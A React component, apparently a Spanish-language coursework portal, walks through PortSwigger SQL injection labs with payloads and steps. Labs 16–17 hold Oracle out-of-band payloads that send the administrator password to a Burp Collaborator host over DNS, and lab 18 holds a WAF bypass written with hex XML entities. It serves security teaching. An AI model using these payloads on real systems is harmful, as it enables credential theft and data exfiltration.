                code: "Intruder → Cluster Bomb → §POS§ + §CHAR§ → Filter by response time >9000ms"
            },
            {
                title: "Reconstrucción y acceso",
                text: "Los caracteres con delay de 10s en cada posición forman la contraseña completa. Se inicia sesión con las credenciales obtenidas para resolver el laboratorio.",
                code: "Contraseña reconstruida carácter por carácter → Login exitoso"
            }
        ],
        images: [
            "parcial2/act08_images/P17_img73.png",
            "parcial2/act08_images/P17_img74.png",
            "parcial2/act08_images/P18_img77.png",
            "parcial2/act08_images/P18_img78.png",
        ]
    },
    {
        id: 16,
        title: "Blind SQL injection with out-of-band interaction",
        type: "OAST",
        level: "Practitioner",
        payload: "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % r SYSTEM \"http://BURP-COLLABORATOR/\">%r;]>'),'/l') FROM dual--",
        description: "Exfiltración de datos mediante canal DNS out-of-band usando Burp Collaborator como receptor de las consultas DNS provocadas por la base de datos Oracle.",
        objective: "Hacer que la base de datos Oracle realice una petición DNS hacia un servidor controlado por el atacante, confirmando la inyección OAST en un entorno sin respuesta HTTP visible.",
        analysis: "OAST (Out-of-band Application Security Testing) usa canales de comunicación alternativos. Burp Collaborator es un servidor externo que registra peticiones DNS e HTTP. Al inyectar un payload que genera una entidad XML externa, Oracle intenta resolver el nombre DNS del atacante, confirmando la inyección sin necesidad de respuesta HTTP.",
        impact: "Técnica altamente sigilosa que funciona incluso cuando la aplicación retorna respuestas completamente idénticas y no procesa errores de BD. El canal DNS suele evitar muchos firewalls que sí bloquean HTTP directo. Es la técnica más avanzada de blind SQLi.",
        steps: [
            {
                title: "Configurar Burp Collaborator",
                text: "En Burp Suite se genera un subdominio único de Burp Collaborator que actuará como receptor de la petición DNS. Este subdominio será incluido en el payload XML.",
                code: "Burp Suite → Collaborator → Copy to clipboard → xxxx.burpcollaborator.net"
            },
            {
                title: "Construcción del payload XML con entidad externa",
                text: "Se construye el payload que inyecta un XML con DOCTYPE que define una entidad externa apuntando al Collaborator. Oracle intentará resolver el DNS al procesar el XML.",
                code: "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % r SYSTEM \"http://xxxx.burpcollaborator.net/\">%r;]>'),'/l') FROM dual--"
            },
            {
                title: "Envío con URL Encoding",
                text: "Los caracteres especiales del XML (<, >, %) deben ser codificados en URL encoding para ser correctamente transmitidos en el parámetro HTTP. Se usa Ctrl+U en Burp Repeater.",
                code: "URL Encode → %3c%3fxml... → Enviar desde Repeater"
            },
            {
                title: "Verificación en Collaborator",
                text: "En la pestaña Collaborator de Burp Suite aparece un 'DNS Lookup' registrado desde la IP del servidor de la aplicación, confirmando que la inyección OAST fue exitosa.",
                code: "Collaborator → DNS Lookup received from: x.x.x.x (servidor objetivo)"
            }
        ],
        images: [
            "parcial2/act08_images/P18_img77.png",
            "parcial2/act08_images/P18_img78.png",
            "parcial2/act08_images/P19_img81.png",
            "parcial2/act08_images/P19_img82.png",
        ]
    },
    {
        id: 17,
        title: "Blind SQL injection with out-of-band data exfiltration",
        type: "OAST",
        level: "Practitioner",
        payload: "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % r SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR/\">%r;]>'),'/l') FROM dual--",
        description: "Exfiltración completa de contraseña embebida como subdominio DNS en una petición OAST hacia Burp Collaborator.",
        objective: "Extraer la contraseña del administrador embebiéndola en la petición DNS enviada al servidor Collaborator del atacante, obteniendo el dato completo de una sola petición.",
        analysis: "Extensión del laboratorio anterior: en lugar de solo confirmar la interacción, se embebe la contraseña como parte del subdominio DNS. La concatenación incluye el resultado de la subconsulta SQL directamente en la URL del sistema de entidades externas: 'password_value.collaborator.net'. El servidor DNS del atacante recibe el dato.",
        impact: "Exfiltración de datos completa en una sola petición, completamente fuera de banda. Prácticamente invisible para sistemas de detección que monitorean solo tráfico HTTP. La única forma de detectarlo es con análisis de tráfico DNS saliente del servidor de base de datos.",
        steps: [
            {
                title: "Construcción del payload con datos embebidos",
                text: "Se modifica el payload OAST anterior para incluir la subconsulta SQL dentro de la URL del sistema externo. El resultado de la query se convierte en parte del nombre de dominio DNS.",
                code: "'http://'||(SELECT password FROM users WHERE username='administrator')||'.xxxx.burpcollaborator.net/'"
            },
            {
                title: "Payload completo con EXTRACTVALUE",
                text: "El payload XML completo combina el EXTRACTVALUE de Oracle con la entidad externa que contiene la contraseña concatenada como subdominio.",
                code: "' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % r SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.xxxx.burpcollaborator.net/\">%r;]>'),'/l') FROM dual--"
            },
            {
                title: "Envío y captura",
                text: "Se envía la petición desde Burp Repeater con el payload URL-encoded. En la pestaña Collaborator se registrará la petición DNS con la contraseña como subdominio.",
                code: "URL Encode → Enviar → Verificar Collaborator"
            },
            {
                title: "Lectura del dato en Collaborator",
                text: "El panel de Collaborator muestra el DNS Lookup recibido. El subdominio del nombre de host consultado contiene la contraseña del administrador en texto plano.",
                code: "Lookup: password_value.xxxx.burpcollaborator.net → Contraseña extraída"
            }
        ],
        images: [
            "parcial2/act08_images/P19_img81.png",
            "parcial2/act08_images/P19_img82.png",
            "parcial2/act08_images/P20_img85.png",
        ]
    },
    {
        id: 18,
        title: "SQL injection with filter bypass via XML encoding",
        type: "Filter Bypass",
        level: "Practitioner",
        payload: "&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;",
        description: "Evasión de WAF codificando el payload UNION SELECT en entidades hexadecimales XML para que el firewall no reconozca el SQL mientras la base de datos sí lo ejecuta.",
        objective: "Bypassear el WAF (Web Application Firewall) que bloquea keywords SQL en el body de peticiones POST codificando el payload completo en entidades XML hexadecimales.",
        analysis: "La aplicación usa un WAF que bloquea peticiones con keywords SQL (UNION, SELECT, etc.) en el cuerpo XML del POST. Sin embargo, el WAF no decodifica entidades XML antes de aplicar el filtro. Al codificar el payload completo como entidades hex (&#xNN;), el WAF no lo reconoce como SQL, pero el parser XML del servidor sí lo decodifica antes de pasarlo a la base de datos.",
        impact: "Demuestra que los filtros de seguridad son ineficaces si no realizan decodificación recursiva de los datos antes de aplicar reglas. Un WAF bypasseado en producción es peor que no tener WAF, ya que da falsa sensación de seguridad.",
        steps: [
            {
                title: "Identificación del endpoint vulnerable y el WAF",
                text: "La aplicación tiene un endpoint POST /api/stock que acepta XML. Al intentar inyectar SQL directo en el campo storeId, el WAF retorna HTTP 403 Forbidden.",
                code: "<storeId>1 UNION SELECT NULL--</storeId>  →  HTTP 403 Forbidden"
            },
            {
                title: "Codificación del payload con Hackvertor",
                text: "En Burp Suite se instala la extensión Hackvertor. Se selecciona el payload SQL y se aplica la codificación hex_entities para convertir cada carácter a su entidad XML hexadecimal.",
                code: "UNION SELECT password FROM users  →  &#x55;&#x4e;&#x49;&#x4f;&#x4e;..."
            },
            {
                title: "Envío del payload codificado",
                text: "El body XML contiene el payload completamente codificado. El WAF solo ve caracteres XML aparentemente inocentes. El servidor decodifica las entidades y ejecuta el SQL.",
                code: "<storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;username,password&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;users</storeId>"
            },
            {
                title: "Extracción y acceso",
                text: "El servidor retorna HTTP 200 con el resultado de la consulta SQL incluyendo las credenciales del administrador. Se inicia sesión y el laboratorio queda resuelto.",
                code: "HTTP/1.1 200 OK → administrator : s3cr3tpassword → Login exitoso"
            }
        ],
        images: [
            "parcial2/act08_images/P19_img78.png",
            "parcial2/act08_images/P20_img81.png",
            "parcial2/act08_images/P20_img82.png",
        ]
    }
];

const getIconForType = (type) => {
    switch (type) {
        case "In-band": return <FaCode className="text-blue-400" />;
        case "UNION-based": return <FaDatabase className="text-purple-400" />;
        case "Blind": return <FaEyeSlash className="text-red-400" />;
        case "Blind (Time)": return <FaClock className="text-yellow-400" />;
        case "Error-based": return <FaExclamationTriangle className="text-orange-400" />;
        case "OAST": return <FaWifi className="text-green-400" />;
        case "Filter Bypass": return <FaShieldAlt className="text-cyan-400" />;
        default: return <FaServer />;
    }
};

const SQLInjectionLabs = () => {
    const [activeLabId, setActiveLabId] = useState(1);
    const [simulated, setSimulated] = useState(false);
    const [inputValue, setInputValue] = useState('');

    const handleLabChange = (id) => {
        setActiveLabId(id);
        setSimulated(false);
        setInputValue('');
    };

    const activeLab = labsData.find(lab => lab.id === activeLabId);

    return (
        <div className="flex flex-col lg:flex-row gap-0 bg-[#0a0f1a] rounded-xl border border-gray-800 shadow-2xl font-sans items-start relative pb-6 lg:pb-0">

            {/* Sidebar Navigation (Sticky) */}
            <div className="lg:w-1/3 w-full bg-[#05080f] border-b lg:border-b-0 lg:border-r border-gray-800 flex flex-col h-[400px] lg:h-[calc(100vh-8rem)] lg:sticky lg:top-24 rounded-tl-xl lg:rounded-l-xl lg:rounded-tr-none z-10 shadow-2xl">
                <div className="p-4 border-b border-gray-800 bg-black/40">
                    <h3 className="text-green-500 font-mono font-bold tracking-widest text-sm flex items-center gap-2">
                        <FaServer /> PORTAL DE LABORATORIOS
                    </h3>
                    <p className="text-xs text-gray-500 mt-1">Selecciona un modelo de explotación para analizar su arquitectura e impacto correspondiente.</p>
                </div>

                <div className="flex-1 overflow-y-auto custom-scrollbar p-2 space-y-1">
                    {labsData.map((lab) => (
                        <button
                            key={lab.id}
                            onClick={() => handleLabChange(lab.id)}
                            className={`w-full text-left p-3 rounded-lg transition-all duration-300 border relative overflow-hidden group ${activeLabId === lab.id
                                ? 'bg-green-900/20 border-green-500/50 text-white shadow-[0_0_15px_rgba(34,197,94,0.15)] ring-1 ring-green-500/30'
                                : 'border-transparent text-gray-400 hover:bg-gray-800/60 hover:text-gray-200'
                                }`}
                        >
                            {/* Animated indicator for active state */}
                            {activeLabId === lab.id && (
                                <motion.div layoutId="activeLabIndicator" className="absolute left-0 top-0 w-1 h-full bg-green-500 shadow-[0_0_10px_rgba(34,197,94,0.8)]" />
                            )}

                            <div className="flex items-center justify-between mb-1">
                                <span className={`font-mono text-sm md:text-base font-bold w-6 h-6 rounded flex items-center justify-center border transition-colors ${activeLabId === lab.id ? 'bg-green-900/50 border-green-500/50 text-green-400' : 'bg-black/50 border-gray-700'
                                    }`}>
                                    {String(lab.id).padStart(2, '0')}
                                </span>
                                <span className={`text-[9px] px-2 py-0.5 rounded uppercase font-bold tracking-wider ${lab.level === 'Apprentice' ? 'bg-blue-500/20 text-blue-400' : 'bg-orange-500/20 text-orange-400'
                                    }`}>
                                    {lab.level}
                                </span>
                            </div>

                            <div className="flex items-center gap-2 mt-2">
                                <div className="p-1.5 bg-black/40 rounded border border-gray-800 group-hover:border-gray-600 transition-colors">
                                    {getIconForType(lab.type)}
                                </div>
                                <p className="text-xs truncate font-medium flex-1 group-hover:text-white transition-colors">{lab.type}</p>
                                {activeLabId !== lab.id && <FaChevronRight className="text-gray-600 group-hover:text-green-500 transition-colors opacity-0 group-hover:opacity-100 transform translate-x-[-10px] group-hover:translate-x-0" />}
                            </div>
                        </button>
                    ))}
                </div>
            </div>

            {/* Main Content Area */}
            <div className="lg:w-2/3 p-6 lg:p-10 relative flex flex-col min-h-full">
                <AnimatePresence mode="wait">
                    <motion.div
                        key={activeLab.id}
                        initial={{ opacity: 0, x: 20 }}
                        animate={{ opacity: 1, x: 0 }}
                        exit={{ opacity: 0, x: -20 }}
                        transition={{ duration: 0.3 }}
                        className="flex-1 flex flex-col h-full"
                    >
                        {/* Header */}
                        <div className="mb-6 pb-4 border-b border-gray-800">
                            <div className="flex items-center gap-3 mb-4">
                                <span className="bg-green-500/10 text-green-400 border border-green-500/30 px-3 py-1 text-xs font-mono rounded-full uppercase tracking-wider shadow-[0_0_10px_rgba(34,197,94,0.2)]">
                                    {activeLab.type}
                                </span>
                                <span className="bg-gray-800 text-gray-300 px-3 py-1 text-xs font-mono rounded-full">
                                    LAB #{String(activeLab.id).padStart(2, '0')}
                                </span>
                            </div>
                            <h2 className="text-xl lg:text-2xl font-bold text-white leading-tight mb-2">
                                {activeLab.title}
                            </h2>
                            <p className="text-gray-400 text-sm italic font-mono mb-4">
                                - {activeLab.description}
                            </p>
                        </div>

                        {/* Informative Grid */}
                        <div className="flex flex-col gap-6 w-full max-w-4xl mx-auto mb-6">
                            <div className="bg-blue-900/10 border border-blue-900/30 p-4 rounded-lg">
                                <h4 className="text-blue-400 text-sm md:text-base font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
                                    <FaCheckCircle /> Objetivo del Ataque
                                </h4>
                                <p className="text-sm md:text-base text-gray-300 leading-relaxed font-mono">
                                    {activeLab.objective}
                                </p>
                            </div>
                            <div className="bg-red-900/10 border border-red-900/30 p-4 rounded-lg">
                                <h4 className="text-red-400 text-sm md:text-base font-bold font-mono tracking-widest uppercase mb-2 flex items-center gap-2">
                                    <FaExclamationTriangle /> Análisis de Impacto
                                </h4>
                                <p className="text-sm md:text-base text-gray-300 leading-relaxed font-mono">
                                    {activeLab.impact}
                                </p>
                            </div>
                        </div>

                        {/* Evidence Gallery (if available) */}
                        {activeLab.images && (
                            <div className="mb-6 p-4 border border-violet-500/20 bg-violet-900/10 rounded-lg">
                                <h4 className="text-violet-400 text-sm md:text-base font-bold font-mono tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-violet-500/30 pb-2">
                                    EJECUCIÓN DEL LABORATORIO & EVIDENCIA VISUAL
                                </h4>
                                <div className="flex flex-col gap-6 w-5/6 max-w-3xl mx-auto">
                                    {activeLab.images.map((imgSrc, idx) => (
                                        <div key={idx} className="relative group overflow-hidden rounded border border-gray-700 hover:border-violet-500 transition-colors">
                                            <div className="absolute top-0 left-0 bg-violet-500/80 text-white text-[9px] font-bold px-2 py-0.5 rounded-br z-10">Paso {idx + 1}</div>
                                            <img src={`${import.meta.env.BASE_URL}${imgSrc}`} alt={`Evidencia Lab ${activeLab.id} Paso ${idx + 1}`} className="w-full h-auto object-cover transform transition-transform duration-500 group-hover:scale-105" />
                                        </div>
                                    ))}
                                </div>
                            </div>
                        )}

                        {/* Interactive Simulation Sandbox */}
                        <div className="flex-none bg-[#0a0a0a] rounded-xl border border-gray-800 overflow-hidden flex flex-col font-sans shadow-2xl relative mb-8">
                            {/* Browser/System Header */}
                            <div className="bg-gray-900 border-b border-gray-800 px-4 py-2 flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                    <div className="flex gap-1.5 mr-2">
                                        <div className="w-3 h-3 rounded-full bg-red-500"></div>
                                        <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                                        <div className="w-3 h-3 rounded-full bg-green-500"></div>
                                    </div>
                                    <div className="bg-gray-800 text-gray-400 text-[10px] md:text-xs px-3 py-1 rounded-md ml-2 font-mono flex items-center gap-2">
                                        <FaServer />
                                        {activeLab.id === 2 ? "https://portswigger.net/login" : 
                                         activeLab.id === 18 ? "https://portswigger.net/api/stock" : 
                                         "https://portswigger.net/filter?category="}
                                    </div>
                                </div>
                                <span className="text-gray-500 text-[9px] md:text-[10px] uppercase font-bold tracking-widest flex items-center gap-1">
                                    <FaBug /> TARGET SIMULATOR
                                </span>
                            </div>

                            {/* Simulation Body */}
                            <div className="p-5 md:p-8 flex-none space-y-4">
                                
                                {/* URL Parameter Context */}
                                {(![2, 11, 12, 13, 14, 15, 16, 17, 18].includes(activeLab.id)) && (
                                    <div className="flex flex-col gap-3">
                                        <p className="text-sm text-gray-400 font-medium mb-1">Simulación: Inyección en Parámetro GET (URL)</p>
                                        <div className="flex items-center bg-black border border-gray-700 rounded-lg overflow-hidden focus-within:border-blue-500 transition-colors">
                                            <span className="text-gray-500 font-mono text-xs md:text-sm pl-4 pr-1 bg-gray-900/50 py-3 border-r border-gray-800">?category=</span>
                                            <input 
                                                type="text" 
                                                value={inputValue !== '' ? inputValue : activeLab.payload}
                                                onChange={(e) => setInputValue(e.target.value)}
                                                className="w-full bg-transparent text-blue-400 px-3 py-3 focus:outline-none font-mono text-sm"
                                                onKeyDown={(e) => e.key === 'Enter' && setSimulated(true)}
                                            />
                                        </div>
                                    </div>
                                )}

                                {/* Login Context */}
                                {activeLab.id === 2 && (
                                    <div className="flex flex-col gap-3 max-w-sm mx-auto bg-gray-900/40 p-6 rounded-xl border border-gray-800">
                                        <h3 className="text-white text-lg font-bold text-center mb-2">Account Login</h3>
                                        <div className="space-y-4">
                                            <div>
                                                <label className="text-xs text-gray-400 mb-1 block">Username</label>
                                                <input 
                                                    type="text" 
                                                    value={inputValue !== '' ? inputValue : activeLab.payload}
                                                    onChange={(e) => setInputValue(e.target.value)}
                                                    className="w-full bg-black border border-gray-700 text-green-400 px-4 py-2.5 rounded focus:outline-none focus:border-green-500 font-mono text-sm"
                                                    onKeyDown={(e) => e.key === 'Enter' && setSimulated(true)}
                                                />
                                            </div>
                                            <div>
                                                <label className="text-xs text-gray-400 mb-1 block">Password</label>
                                                <input 
                                                    type="password" 
                                                    value="********"
                                                    readOnly
                                                    className="w-full bg-black/50 border border-gray-800 text-gray-500 px-4 py-2.5 rounded focus:outline-none font-mono text-sm cursor-not-allowed"
                                                />
                                            </div>
                                        </div>
                                    </div>
                                )}

                                {/* Cookie Context */}
                                {[11, 12, 13, 14, 15, 16, 17].includes(activeLab.id) && (
                                    <div className="flex flex-col gap-3">
                                        <p className="text-sm text-gray-400 font-medium mb-1">Simulación: Inyección en Cabecera HTTP (Cookie)</p>
                                        <div className="bg-black border border-gray-700 rounded-lg p-4 font-mono text-xs md:text-sm text-gray-300">
                                            <div><span className="text-purple-400">GET</span> / HTTP/1.1</div>
                                            <div><span className="text-blue-400">Host:</span> target.com</div>
                                            <div className="flex items-center mt-2 pt-2 border-t border-gray-800">
                                                <span className="text-yellow-400 mr-2 whitespace-nowrap">Cookie: TrackingId=</span>
                                                <input 
                                                    type="text" 
                                                    value={inputValue !== '' ? inputValue : activeLab.payload}
                                                    onChange={(e) => setInputValue(e.target.value)}
                                                    className="w-full bg-gray-900 border border-gray-700 text-green-400 px-2 py-1 rounded focus:outline-none focus:border-green-500 font-mono"
                                                    onKeyDown={(e) => e.key === 'Enter' && setSimulated(true)}
                                                />
                                            </div>
                                        </div>
                                    </div>
                                )}

                                {/* XML Context */}
                                {activeLab.id === 18 && (
                                    <div className="flex flex-col gap-3">
                                        <p className="text-sm text-gray-400 font-medium mb-1">Simulación: Inyección en XML Body (POST)</p>
                                        <div className="bg-black border border-gray-700 rounded-lg p-4 font-mono text-xs md:text-sm text-gray-300">
                                            <div className="text-pink-400 mb-2">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div>
                                            <div>&lt;stockCheck&gt;</div>
                                            <div className="pl-4 flex items-center my-1">
                                                <span>&lt;storeId&gt;</span>
                                                <input 
                                                    type="text" 
                                                    value={inputValue !== '' ? inputValue : activeLab.payload}
                                                    onChange={(e) => setInputValue(e.target.value)}
                                                    className="flex-1 mx-2 bg-gray-900 border border-gray-700 text-green-400 px-2 py-1 rounded focus:outline-none focus:border-green-500 font-mono min-w-[200px]"
                                                    onKeyDown={(e) => e.key === 'Enter' && setSimulated(true)}
                                                />
                                                <span>&lt;/storeId&gt;</span>
                                            </div>
                                            <div>&lt;/stockCheck&gt;</div>
                                        </div>
                                    </div>
                                )}

                                <div className="flex justify-end mt-4">
                                    <button 
                                        onClick={() => setSimulated(true)}
                                        className="bg-blue-600 hover:bg-blue-500 text-white px-8 py-2.5 rounded-lg font-bold transition-all shadow-[0_0_15px_rgba(37,99,235,0.3)] hover:shadow-[0_0_20px_rgba(37,99,235,0.5)] text-sm uppercase tracking-wide flex items-center gap-2"
                                    >
                                        <FaTerminal /> Enviar Petición
                                    </button>
                                </div>

                                <AnimatePresence>
                                    {simulated && (
                                        <motion.div 
                                            initial={{ height: 0, opacity: 0, y: -10 }}
                                            animate={{ height: "auto", opacity: 1, y: 0 }}
                                            exit={{ height: 0, opacity: 0 }}
                                            className="border-l-4 border-red-500 pl-4 py-4 bg-[#0a0505] mt-6 rounded-r relative overflow-hidden"
                                        >
                                            <div className="absolute top-0 right-0 w-32 h-32 bg-red-500/5 blur-3xl rounded-full"></div>
                                            <div className="text-red-500 font-bold mb-3 flex items-center gap-2 text-sm uppercase tracking-wider">
                                                <FaBug className="animate-pulse" /> Respuesta del Servidor Interceptada
                                            </div>
                                            
                                            {/* Mocking actual response based on context */}
                                            <div className="bg-black/80 border border-red-900/30 p-4 rounded text-green-400/90 break-all shadow-inner overflow-x-auto whitespace-pre-wrap font-mono text-xs md:text-sm leading-relaxed mt-2 text-gray-300">
                                                {[11, 14].includes(activeLab.id) ? (
                                                     <div className="animate-pulse text-yellow-500">HTTP/1.1 200 OK<br/>[... Esperando respuesta... Latencia de servidor detectada (10,000ms)]</div>
                                                ) : activeLab.id === 2 ? (
                                                     <div><span className="text-green-500">HTTP/1.1 302 Found</span><br/>Location: /my-account?id=administrator<br/><br/>Set-Cookie: session=xyz123...</div>
                                                ) : activeLab.id === 13 ? (
                                                     <div className="text-red-400">HTTP/1.1 500 Internal Server Error<br/><br/>Unterminated string literal at character 52. Error converting 'S3cr3tP4ss' to string.</div>
                                                ) : [12, 15, 16, 17].includes(activeLab.id) ? (
                                                     <div className="text-blue-400">DNS Lookup Received at Burp Collaborator Server.<br/>Payload successfully triggered Out-Of-Band interaction.</div>
                                                ) : (
                                                     <div><span className="text-green-500">HTTP/1.1 200 OK</span><br/>Content-Type: text/html<br/><br/>&lt;!-- Backend Database Dump / SQL Syntax Altered --&gt;<br/>[+] {activeLab.payload} executed.</div>
                                                )}
                                            </div>
                                            <p className="mt-4 text-gray-400 text-xs md:text-sm italic border-t border-gray-800 pt-3">
                                                * El payload ha penetrado las validaciones. Revisa el análisis inferior para ver el desglose en profundidad.
                                            </p>
                                        </motion.div>
                                    )}
                                </AnimatePresence>

                            </div>
                        </div>

                        {/* Explicación Técnica (Análisis Step-By-Step) */}
                        <div className="mt-6 bg-gray-900/40 border-l-4 border-yellow-500 p-5 rounded-r relative overflow-hidden">
                            {/* Decorative background for steps */}
                            <FaCode className="absolute top-4 right-4 text-4xl text-yellow-500/5 opacity-50" />

                            <h4 className="text-yellow-500 text-sm md:text-base font-bold tracking-widest uppercase mb-4 flex items-center gap-2 border-b border-yellow-500/20 pb-3">
                                <FaCode /> Bitácora de Explotación Técnica
                            </h4>

                            {activeLab.steps ? (
                                <div className="mt-4 relative space-y-3">
                                    {activeLab.steps.map((step, index) => (
                                        <div key={index} className="flex gap-4 relative z-10 px-2 group">
                                            <div className="pt-1 flex-1">
                                                {step.text && (
                                                    <p className="text-sm md:text-base leading-relaxed mb-1 text-gray-200 text-justify">
                                                        <span className="text-yellow-500/80 mr-2 font-bold opacity-70">▹</span> 
                                                        <span dangerouslySetInnerHTML={{ __html: step.text.replace(/\s+/g, ' ')
                                                            .replace(/\b(Burp Suite|Repeater|Proxy|Intruder|Payload|SQL|SQLi|Collaborator|TrackingId|session|GET|POST|Cookie|Administrator|administrator)\b/gi, '<span class="text-blue-400 font-bold">$1</span>')
                                                            .replace(/(?<!=)(['"])(.*?)\1/g, '<span class="text-yellow-300/90 italic">"$2"</span>')
                                                            .replace(/\b(Paso \d+|Identificación:|Explotación:|Preparación:|Objetivo:|Resultado:)\b/gi, '<span class="text-purple-400 font-bold underline">$1</span>')
                                                        }} />
                                                    </p>
                                                )}
                                                {step.code && (
                                                    <div className="bg-[#050505] border border-gray-800 p-4 rounded-lg text-green-400 font-mono text-xs md:text-sm break-all shadow-xl block w-full relative group-hover:border-green-900/50 transition-colors my-4">
                                                        <div className="absolute top-0 left-0 w-1 h-full bg-green-500 rounded-l-md opacity-80"></div>
                                                        <span className="text-red-500 font-bold mr-2">root@hacker:~#</span> {step.code}
                                                    </div>
                                                )}
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            ) : (
                                <p className="text-sm md:text-base text-gray-300 leading-relaxed px-2 text-justify">
                                    <span className="text-yellow-500/80 mr-2 font-bold opacity-70">▹</span> {activeLab.analysis}
                                </p>
                            )}
                        </div>

                    </motion.div>
                </AnimatePresence>
            </div>

        </div>
    );
};

export default SQLInjectionLabs;
